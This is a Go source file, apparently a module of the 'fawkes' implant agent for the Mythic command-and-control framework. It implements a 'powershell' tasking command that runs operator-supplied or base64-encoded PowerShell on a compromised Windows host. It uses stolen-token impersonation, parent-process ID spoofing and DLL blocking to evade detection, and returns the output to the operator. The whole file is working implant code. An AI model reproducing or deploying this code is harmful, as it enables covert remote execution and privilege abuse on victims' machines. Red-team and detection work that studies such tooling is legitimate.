//go:build windows
// +build windows

package commands

import (
	"context"
	"encoding/json"
	"os/exec"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// PowershellCommand implements the powershell command
type PowershellCommand struct{}

// Name returns the command name
func (c *PowershellCommand) Name() string {
	return "powershell"
}

// Description returns the command description
func (c *PowershellCommand) Description() string {
	return "Execute a PowerShell command or script"
}

// powershellParams represents structured parameters from Mythic
type powershellParams struct {
	Command string `json:"command"`
	Encoded bool   `json:"encoded"`
}

// parsePowershellParams extracts command and encoded flag from task params.
// Supports both JSON (structured params) and plain text (backward compat).
func parsePowershellParams(params string) (string, bool) {
	var p powershellParams
	if err := json.Unmarshal([]byte(params), &p); err == nil && p.Command != "" {
		return p.Command, p.Encoded
	}
	// Backward compat: entire params string is the command
	return params, false
}

// Execute executes the powershell command
func (c *PowershellCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("Error: No command specified")
	}

	command, encoded := parsePowershellParams(task.Params)
	if command == "" {
		return errorResult("Error: No command specified")
	}

	opts := DefaultPSOptions()

	// Check if impersonating — use CreateProcessWithTokenW path
	tokenMutex.Lock()
	token := gIdentityToken
	tokenMutex.Unlock()

	if token != 0 {
		cmdLine := BuildPSCmdLine(command, opts, encoded)
		output, err := runWithToken(token, cmdLine)
		if err != nil {
			outputStr := strings.TrimSpace(output)
			if outputStr != "" {
				return errorf("%s\nError: %v", outputStr, err)
			}
			return errorf("Error executing PowerShell: %v", err)
		}
		outputStr := strings.TrimSpace(output)
		if outputStr == "" {
			outputStr = "Command executed successfully (no output)"
		}
		return structs.CommandResult{
			Output:    outputStr,
			Status:    "success",
			Completed: true,
		}
	}

	// Standard path — no impersonation
	// Check for PPID spoofing or BlockDLLs — use extended attrs path
	ppid := GetDefaultPPID()
	if blockDLLsEnabled || ppid > 0 {
		cmdLine := BuildPSCmdLine(command, opts, encoded)
		output, err := runWithExtendedAttrs(cmdLine, ppid, blockDLLsEnabled)
		if err != nil {
			outputStr := strings.TrimSpace(output)
			if outputStr != "" {
				return errorf("%s\nError: %v", outputStr, err)
			}
			return errorf("Error executing PowerShell: %v", err)
		}
		outputStr := strings.TrimSpace(output)
		if outputStr == "" {
			outputStr = "Command executed successfully (no output)"
		}
		return structs.CommandResult{
			Output:    outputStr,
			Status:    "success",
			Completed: true,
		}
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()

	var args []string
	if encoded {
		args = BuildPSArgsEncoded(command, opts)
	} else {
		args = BuildPSArgs(command, opts)
	}

	cmd := exec.CommandContext(ctx, "powershell.exe", args...)
	output, err := cmd.CombinedOutput()

	if err != nil {
		outputStr := string(output)
		if ctx.Err() == context.DeadlineExceeded {
			return errorf("PowerShell command timed out after 5 minutes\n%s", outputStr)
		}
		if outputStr != "" {
			return errorf("%s\nError: %v", outputStr, err)
		}
		return errorf("Error executing PowerShell: %v", err)
	}

	outputStr := strings.TrimSpace(string(output))
	if outputStr == "" {
		outputStr = "Command executed successfully (no output)"
	}

	return structs.CommandResult{
		Output:    outputStr,
		Status:    "success",
		Completed: true,
	}
}
